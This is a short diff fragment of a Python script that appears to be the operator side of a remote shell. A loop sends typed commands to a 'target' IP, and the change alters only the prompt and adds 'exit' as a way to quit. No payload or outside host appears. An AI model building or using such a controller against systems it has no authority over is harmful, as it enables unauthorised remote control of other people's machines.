@@ -23,10 +23,10 @@ def j_recv():
 def target_comun():
     while True:
         
-        command = input(f"shell ~ {ip} : ")
+        command = input(f"$[{ip}] Shell >")
         j_send(command)
 
-        if command == 'quit':
+        if command == 'quit' or command == "exit":
             break
 
 # cd /home
